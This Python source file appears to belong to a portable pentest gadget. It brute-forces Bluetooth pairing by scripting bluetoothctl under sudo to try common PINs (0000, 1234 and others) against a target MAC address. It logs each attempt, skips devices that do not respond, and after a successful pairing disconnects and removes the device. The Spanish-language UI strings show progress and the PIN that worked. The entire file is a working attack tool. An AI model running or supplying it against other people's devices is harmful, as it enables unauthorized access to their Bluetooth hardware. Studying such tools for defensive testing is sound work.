#!/usr/bin/env python3
# tools/bt/bt_force_pin.py

import subprocess
import time
import os
import json
import select
import signal
from display.screen import MenuDisplay
from config.gpio_config import read_buttons


PINS = ["0000", "1234", "4321", "1111", "2221"]
PER_PIN_TIMEOUT = 15          
NO_RESPONSE_THRESHOLD = 2   
STATE_DIR = "/opt/beetle/tools/bt/state"
STATE_FILE = os.path.join(STATE_DIR, "bt_force_state.json")
BT_REPORTS_DIR = "/opt/beetle/reports/bt"
PKILL_ON_CLEAN = True

def ensure_dirs():
    os.makedirs(BT_REPORTS_DIR, exist_ok=True)
    os.makedirs(STATE_DIR, exist_ok=True)

def load_state():
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                return json.load(f)
    except Exception:
        pass
    return {}

def save_state(state):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except Exception:
        pass

def mark_no_response(state, mac):
    entry = state.get(mac, {"no_response_count": 0, "last_no_response": None})
    entry["no_response_count"] = entry.get("no_response_count", 0) + 1
    entry["last_no_response"] = time.time()
    state[mac] = entry
    save_state(state)

def reset_state_on_success(state, mac):
    if mac in state:
        state.pop(mac, None)
        save_state(state)

def is_blacklisted(state, mac):
    entry = state.get(mac)
    if not entry:
        return False
    return entry.get("no_response_count", 0) >= NO_RESPONSE_THRESHOLD

def kill_proc_group(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        try:
            proc.terminate()
        except Exception:
            pass

def force_kill_bluetoothctl():
   
    try:
        subprocess.run(["pkill", "-f", "bluetoothctl"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def run_bt_force_pin(name, mac, rssi):
 
    ensure_dirs()
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    logfile = os.path.join(BT_REPORTS_DIR, f"forcepin_{mac.replace(':','')}_{timestamp}.log")

    state = load_state()

 
    if state.get(mac, {}).get("no_response_count", 0) > 0:
        display.show_message(["Ya se intentó esta", "MAC sin respuesta", "del Dispositivo"], center=True)
        with open(logfile, "a") as logf:
            logf.write(f"[{time.strftime('%H:%M:%S')}] MAC {mac} ya intentada en ejecuciones previas. Saltando.\n")
        time.sleep(1.5)
        return

    if is_blacklisted(state, mac):
        display.show_message(["sin respuesta en", "dispositivo (skipped)"], center=True)
        with open(logfile, "a") as logf:
            logf.write(f"[{time.strftime('%H:%M:%S')}] MAC {mac} saltada: exceso de intentos previos sin respuesta.\n")
        time.sleep(1.5)
        return
    display.show_message(["Inicializando BT...", ""], center=True)
    try:
        
        proc_bt = subprocess.Popen(
            ["bluetoothctl"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            preexec_fn=os.setsid
        )
        init_cmds = [
            "power on",
            "agent KeyboardDisplay",
            "default-agent",
            "discoverable off",
            "pairable on"
        ]
        for cmd in init_cmds:
            try:
                proc_bt.stdin.write(cmd + "\n")
                proc_bt.stdin.flush()
                time.sleep(0.25)
            except Exception:
                pass
        try:
            proc_bt.stdin.write("exit\n")
            proc_bt.stdin.flush()
        except Exception:
            pass
        try:
            kill_proc_group(proc_bt)
            proc_bt.wait(timeout=2)
        except Exception:
            pass
    except Exception:
        display.show_message(["Error:", "init bluetoothctl"], center=True)
        time.sleep(1.5)
        return

    display.show_message([f"BT FORCE PIN:", mac[-5:], "Probando..."], center=False)
    time.sleep(1)

    with open(logfile, "a") as logf:
        aborted = False
        overall_no_response = False

        for pin in PINS:
            if read_buttons().get("enter"):
                logf.write(f"[{time.strftime('%H:%M:%S')}] Abortado por usuario antes de intentar PIN {pin}.\n")
                aborted = True
                break

            logf.write(f"[{time.strftime('%H:%M:%S')}] Intentando PIN: {pin}\n")
            script = f"""
agent KeyboardDisplay
default-agent
pair {mac}
"""

            proc = None
            try:
                proc = subprocess.Popen(
                    ["sudo", "bluetoothctl"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    preexec_fn=os.setsid
                )

                start_time = time.time()
                success = False
                pin_sent = False
                last_output_time = time.time()

                try:
                    proc.stdin.write(script)
                    proc.stdin.flush()
                except Exception:
                    pass

                while True:
                  
                    if read_buttons().get("enter"):
                        logf.write(f"[{time.strftime('%H:%M:%S')}] Abortado por usuario durante intento PIN {pin}.\n")
                        aborted = True
                        break

                
                    rlist, _, _ = select.select([proc.stdout], [], [], 0.5)
                    if not rlist:
                 
                        if time.time() - last_output_time > PER_PIN_TIMEOUT:
                            logf.write(f"[{time.strftime('%H:%M:%S')}] Timeout sin respuesta en intento PIN {pin}.\n")
                        
                            overall_no_response = True
                            break
                 
                        continue

           
                    try:
                        line = proc.stdout.readline()
                    except Exception as e:
                        logf.write(f"[{time.strftime('%H:%M:%S')}] Error leyendo stdout: {e}\n")
                        break

                    if not line:
                 
                        break
                    last_output_time = time.time()
                    logf.write(line)

                    if (not pin_sent) and ("Enter PIN" in line or "Request PIN code" in line or "Passkey:" in line):
                        try:
                            proc.stdin.write(f"{pin}\n")
                            proc.stdin.flush()
                            pin_sent = True
                            logf.write(f"[{time.strftime('%H:%M:%S')}] PIN enviado: {pin}\n")
                        except Exception:
                            logf.write(f"[{time.strftime('%H:%M:%S')}] Error enviando PIN.\n")

                    if "Pairing successful" in line or "Paired: yes" in line or "Paired: no" not in line and "paired" in line.lower():
               
                        success = True
                        break

      
                if aborted:
                    try:
                        if proc and proc.stdin:
                            proc.stdin.write("quit\n")
                            proc.stdin.flush()
                    except Exception:
                        pass
                    try:
                        if proc:
                            kill_proc_group(proc)
                            proc.wait(timeout=2)
                    except Exception:
                        pass
                    break

            
                if overall_no_response:
              
                    try:
                        if proc and proc.stdin:
                            proc.stdin.write("quit\n")
                            proc.stdin.flush()
                    except Exception:
                        pass
                    try:
                        if proc:
                            kill_proc_group(proc)
                            proc.wait(timeout=2)
                    except Exception:
                        pass

          
                    if PKILL_ON_CLEAN:
                        force_kill_bluetoothctl()

          
                    display.show_message(["sin respuesta en", "dispositivo"], center=True)
                    time.sleep(1.5)

                  
                    mark_no_response(state, mac)
                    logf.write(f"[{time.strftime('%H:%M:%S')}] No hubo respuesta del dispositivo {mac}. Marcado en estado.\n")
                    return

         
                try:
                    if proc and proc.stdin:
                        proc.stdin.write("quit\n")
                        proc.stdin.flush()
                except Exception:
                    pass
                try:
                    if proc:
                        kill_proc_group(proc)
                        proc.wait(timeout=2)
                except Exception:
                    pass

                if success:
                    logf.write(f"[{time.strftime('%H:%M:%S')}] Emparejado exitoso con PIN {pin}\n")
                    reset_state_on_success(state, mac)
                    try:
                        subprocess.run(["bluetoothctl", "disconnect", mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                        subprocess.run(["bluetoothctl", "remove", mac], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    except Exception:
                        pass

                    display.show_message([f"Emparejado OK!", f"PIN: {pin}", f"{name[:12]}"], center=True)
                    time.sleep(2)
                    display.show_message(["BT Desconectado", "y eliminado"], center=True)
                    time.sleep(2)
                    return
                else:
                    logf.write(f"[{time.strftime('%H:%M:%S')}] PIN {pin} falló\n\n")
                    time.sleep(0.8)

            except Exception as e:
                logf.write(f"[{time.strftime('%H:%M:%S')}] Excepción durante intento: {e}\n")
                try:
                    if proc:
                        kill_proc_group(proc)
                        proc.wait(timeout=2)
                except Exception:
                    pass


        if aborted:
            display.show_message(["   Abortado por   ", "   usuario (ENTER)   "], center=True)
            time.sleep(2)
            return

        mark_no_response(state, mac)
        display.show_message(["Ningún PIN funcionó", f"{name[:12]}"], center=True)
        time.sleep(2)
        logf.write(f"[{time.strftime('%H:%M:%S')}] Terminado: ningún PIN funcionó para {mac}. Marcado en estado.\n")
